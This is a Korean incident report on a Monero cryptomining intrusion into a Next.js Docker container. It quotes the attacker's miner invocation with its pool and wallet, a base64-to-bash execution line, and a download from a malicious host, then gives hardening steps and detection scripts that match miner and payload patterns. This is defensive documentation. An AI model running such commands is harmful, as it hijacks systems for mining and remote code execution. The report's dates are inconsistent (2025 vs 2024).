# 보안 사고 보고서: 크립토마이닝 봇 침입 사건

## 📋 사건 개요

**발생 일시**: 2025년 12월 19일  
**영향 서비스**: `barofarm-frontend` (Next.js 프론트엔드 컨테이너)  
**침입 유형**: 크립토마이닝 봇 (Cryptocurrency Mining Bot)  
**상태**: ✅ 해결 완료 (컨테이너 재생성)

---

## 🔍 사건 상세 분석

### 발견된 악성 활동

1. **악성 파일 다운로드**
   - 파일명: `/tmp/javae` (8.3MB)
   - 다운로드 소스: `accrochezvous.fr (51.91.236.255:443)`
   - 추가 파일: `/tmp/cc.txt` (36KB)

2. **실행 중인 악성 프로세스**

   ```bash
   /tmp/javae -o pool.supportxmr.com:443 -k --tls --cpu-max-threads-hint=60 \
   -u 42s7H81wKKbggZsnd5geEeC7ANWUDhkqf7xhdSgaBd9ZE61qwwh7ch1gBQkE5FbvabAdNTeNV18nBNTpioUqmgHj4h4kks2
   ```

   - 목적: Monero (XMR) 채굴
   - 풀 주소: `pool.supportxmr.com:443`
   - 지갑 주소: `42s7H81wKKbggZsnd5geEeC7ANWUDhkqf7xhdSgaBd9ZE61qwwh7ch1gBQkE5FbvabAdNTeNV18nBNTpioUqmgHj4h4kks2`

3. **시도된 추가 공격**
   - 시스템 서비스 등록 시도 (`/etc/systemd/system/javae.service`)
   - iptables 규칙 조작 시도
   - 시스템 파일 권한 변경 시도 (`chattr`)
   - 로그 파일 생성 시도

### 영향 범위

- ✅ **컨테이너 격리**: Docker 컨테이너 내부에만 제한됨
- ✅ **호스트 시스템**: 영향 없음 (컨테이너 격리로 인해)
- ⚠️ **리소스 사용**: CPU 사용률 증가 (최대 60 스레드)
- ⚠️ **네트워크**: 외부 채굴 풀과 지속적 통신

---

## 🎯 침입 경로 추정

### 가능한 침입 경로

1. **Next.js 애플리케이션 취약점**
   - 서버 사이드 렌더링(SSR) 중 외부 URL 요청 처리
   - `fetch()` 호출 시 악성 스크립트 주입 가능성
   - 로그에서 발견된 패턴:
     ```
     failed to get redirect response TypeError: fetch failed
     [cause]: Error: read ECONNRESET
     ```

2. **의존성 패키지 취약점**
   - `node_modules` 내 악성 패키지 가능성
   - npm/pnpm 패키지 레지스트리 공급망 공격

3. **환경 변수 주입**
   - 환경 변수를 통한 명령어 주입 가능성
   - `.env` 파일 조작

4. **이미지 레이어 오염**
   - Docker 이미지 빌드 과정에서 악성 코드 주입
   - 레지스트리에서 가져온 이미지의 무결성 문제

### 로그 분석 결과

```bash
# 악성 스크립트 실행 시도 (base64 인코딩)
echo IyEvYmluL2Jhc2gK... | base64 -d | /bin/bash

# 외부 서버에서 다운로드
Connecting to accrochezvous.fr (51.91.236.255:443)
saving to '/tmp/javae'
```

**추정**: Next.js 애플리케이션의 서버 사이드 코드에서 외부 URL을 요청하는 과정에서 악성 페이로드가 주입되었을 가능성이 높습니다.

---

## 🛡️ 방지 대책

### 1. 컨테이너 보안 강화

#### 1.1 최소 권한 원칙 (Principle of Least Privilege)

```dockerfile
# Dockerfile에 추가
# 비root 사용자로 실행
RUN addgroup -g 1001 -S nodejs && \
    adduser -S nextjs -u 1001

USER nextjs

# 불필요한 도구 제거
RUN apk del --no-cache curl wget bash
```

#### 1.2 읽기 전용 파일 시스템

```yaml
# docker-compose.yml
services:
  frontend:
    read_only: true
    tmpfs:
      - /tmp:noexec,nosuid,size=100m
      - /var/tmp:noexec,nosuid,size=100m
```

#### 1.3 네트워크 정책

```yaml
# docker-compose.yml
services:
  frontend:
    networks:
      - frontend-network
    # 외부 네트워크 접근 제한
    # 필요한 경우에만 특정 호스트 허용
```

### 2. 런타임 보안 모니터링

#### 2.1 프로세스 모니터링 스크립트

```bash
#!/bin/bash
# /home/ubuntu/scripts/monitor-container.sh

CONTAINER_NAME="barofarm-frontend"
ALERT_EMAIL="admin@barofarm.com"

# 의심스러운 프로세스 감지
SUSPICIOUS=$(docker exec $CONTAINER_NAME ps aux | grep -E "javae|minerd|xmrig|cpuminer" || true)

if [ -n "$SUSPICIOUS" ]; then
    echo "ALERT: Suspicious process detected in $CONTAINER_NAME"
    echo "$SUSPICIOUS"
    # 컨테이너 자동 재시작
    docker restart $CONTAINER_NAME
    # 알림 전송 (선택사항)
    # echo "$SUSPICIOUS" | mail -s "Security Alert" $ALERT_EMAIL
fi

# 의심스러운 파일 감지
SUSPICIOUS_FILES=$(docker exec $CONTAINER_NAME find /tmp -name "javae" -o -name "*.miner*" 2>/dev/null || true)

if [ -n "$SUSPICIOUS_FILES" ]; then
    echo "ALERT: Suspicious files detected in $CONTAINER_NAME"
    echo "$SUSPICIOUS_FILES"
    docker restart $CONTAINER_NAME
fi
```

#### 2.2 Cron 작업 설정

```bash
# /etc/cron.d/container-monitor
*/5 * * * * root /home/ubuntu/scripts/monitor-container.sh >> /var/log/container-monitor.log 2>&1
```

### 3. 애플리케이션 보안

#### 3.1 외부 URL 요청 검증

```typescript
// lib/security.ts
const ALLOWED_DOMAINS = [
  '3.34.14.73', // API Gateway
  'api.barofarm.com',
  // 허용된 도메인만 추가
]

export function validateUrl(url: string): boolean {
  try {
    const urlObj = new URL(url)
    return ALLOWED_DOMAINS.some(
      (domain) => urlObj.hostname === domain || urlObj.hostname.endsWith(`.${domain}`)
    )
  } catch {
    return false
  }
}

// 사용 예시
export async function safeFetch(url: string, options?: RequestInit) {
  if (!validateUrl(url)) {
    throw new Error(`URL not allowed: ${url}`)
  }
  return fetch(url, options)
}
```

#### 3.2 Content Security Policy (CSP)

```typescript
// next.config.js
const nextConfig = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'Content-Security-Policy',
            value: [
              "default-src 'self'",
              "script-src 'self' 'unsafe-inline' 'unsafe-eval'", // 필요한 경우만
              "style-src 'self' 'unsafe-inline'",
              "img-src 'self' data: https:",
              "connect-src 'self' http://3.34.14.73:8080", // API Gateway만 허용
              "frame-ancestors 'none'",
            ].join('; '),
          },
        ],
      },
    ]
  },
}
```

### 4. 의존성 보안

#### 4.1 정기적인 취약점 스캔

```bash
#!/bin/bash
# /home/ubuntu/scripts/scan-dependencies.sh

cd /home/ubuntu/apps/FE

# npm audit
pnpm audit --audit-level=moderate

# Snyk 스캔 (선택사항)
# npx snyk test

# 의심스러운 패키지 확인
pnpm list | grep -E "eval|exec|base64" || true
```

#### 4.2 package.json 검증

```json
{
  "scripts": {
    "preinstall": "npx check-deps",
    "postinstall": "npx audit-ci --moderate"
  }
}
```

### 5. 이미지 보안

#### 5.1 이미지 서명 및 검증

```bash
# 이미지 빌드 시 서명
docker buildx build --push \
  --provenance=true \
  --sbom=true \
  -t ghcr.io/do-develop-space/barofarm-frontend:main .

# 이미지 다운로드 시 검증
docker pull ghcr.io/do-develop-space/barofarm-frontend:main
docker trust inspect ghcr.io/do-develop-space/barofarm-frontend:main
```

#### 5.2 멀티 스테이지 빌드 최적화

```dockerfile
# Dockerfile
FROM node:20-alpine AS builder
# 빌드 단계

FROM node:20-alpine AS runner
# 런타임 단계 - 최소한의 파일만 복사
COPY --from=builder /app/.next ./.next
COPY --from=builder /app/public ./public
# 불필요한 파일 제외
```

### 6. 로그 모니터링

#### 6.1 의심스러운 활동 감지

```bash
#!/bin/bash
# /home/ubuntu/scripts/monitor-logs.sh

CONTAINER_NAME="barofarm-frontend"
SUSPICIOUS_PATTERNS=(
  "javae"
  "minerd"
  "xmrig"
  "pool.supportxmr"
  "accrochezvous"
  "base64.*bash"
  "eval.*exec"
)

for pattern in "${SUSPICIOUS_PATTERNS[@]}"; do
    if docker logs $CONTAINER_NAME 2>&1 | grep -i "$pattern" > /dev/null; then
        echo "ALERT: Suspicious pattern detected: $pattern"
        docker restart $CONTAINER_NAME
        break
    fi
done
```

### 7. 네트워크 보안

#### 7.1 방화벽 규칙

```bash
# 필요한 포트만 열기
sudo ufw allow 22/tcp    # SSH
sudo ufw allow 80/tcp    # HTTP
sudo ufw allow 443/tcp   # HTTPS
sudo ufw allow 3000/tcp  # Frontend (필요한 경우)
sudo ufw enable

# Docker 네트워크 격리
docker network create --driver bridge frontend-network
```

#### 7.2 아웃바운드 트래픽 제한

```yaml
# docker-compose.yml
services:
  frontend:
    # 특정 도메인만 허용 (iptables 또는 네트워크 정책 사용)
    # 또는 외부 네트워크 접근 차단
```

---

## 📊 모니터링 대시보드

### 체크리스트

- [ ] 컨테이너 프로세스 모니터링 (5분마다)
- [ ] 로그 스캔 (의심스러운 패턴)
- [ ] CPU/메모리 사용률 모니터링
- [ ] 네트워크 트래픽 모니터링
- [ ] 의존성 취약점 스캔 (주 1회)
- [ ] 이미지 무결성 검증 (배포 시)

### 모니터링 명령어

```bash
# 프로세스 확인
docker exec barofarm-frontend ps aux

# CPU/메모리 사용률
docker stats barofarm-frontend --no-stream

# 네트워크 연결 확인
docker exec barofarm-frontend netstat -tuln

# 최근 로그 확인
docker logs barofarm-frontend --tail 100 | grep -i "error\|warn\|suspicious"

# 파일 시스템 변경 확인
docker exec barofarm-frontend find /tmp -type f -mtime -1
```

---

## 🚨 사고 대응 절차

### 1단계: 즉시 대응

```bash
# 1. 컨테이너 중지
docker stop barofarm-frontend

# 2. 컨테이너 제거
docker rm barofarm-frontend

# 3. 악성 파일 확인 (선택사항)
docker run --rm -v barofarm-frontend_data:/data alpine find /data -name "javae"
```

### 2단계: 원인 분석

```bash
# 1. 로그 수집
docker logs barofarm-frontend > /tmp/incident-logs-$(date +%Y%m%d).log

# 2. 프로세스 덤프
docker exec barofarm-frontend ps aux > /tmp/incident-processes-$(date +%Y%m%d).log

# 3. 네트워크 연결 확인
docker exec barofarm-frontend netstat -tuln > /tmp/incident-network-$(date +%Y%m%d).log
```

### 3단계: 복구

```bash
# 1. 깨끗한 이미지로 재시작
cd /home/ubuntu/apps/FE
docker compose pull frontend
docker compose up -d --force-recreate frontend

# 2. 정상 동작 확인
curl -I http://localhost:3000
docker exec barofarm-frontend ps aux
```

### 4단계: 사후 조치

1. 보안 패치 적용
2. 모니터링 강화
3. 문서화 및 팀 공유
4. 재발 방지 대책 수립

---

## 📝 권장 사항

### 즉시 적용

1. ✅ **컨테이너 재생성 완료** (이미 적용됨)
2. ⚠️ **프로세스 모니터링 스크립트 배포** (우선순위: 높음)
3. ⚠️ **외부 URL 검증 로직 추가** (우선순위: 높음)
4. ⚠️ **CSP 헤더 설정** (우선순위: 중간)

### 단기 (1주일 내)

1. 의존성 취약점 스캔 및 업데이트
2. 로그 모니터링 자동화
3. Docker 네트워크 격리 설정

### 중기 (1개월 내)

1. 이미지 서명 및 검증 프로세스 도입
2. 보안 스캔 도구 통합 (Snyk, Trivy 등)
3. 정기적인 보안 감사

---

## 📚 참고 자료

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [Next.js Security Headers](https://nextjs.org/docs/advanced-features/security-headers)
- [Container Security Scanning](https://docs.docker.com/scout/)

---

## 📅 문서 이력

- **2024-12-19**: 초기 문서 작성 (사고 발생 및 해결)
- **2024-12-19**: 방지 대책 추가

---

**작성자**: 보안 팀  
**검토자**: [검토자 이름]  
**승인자**: [승인자 이름]
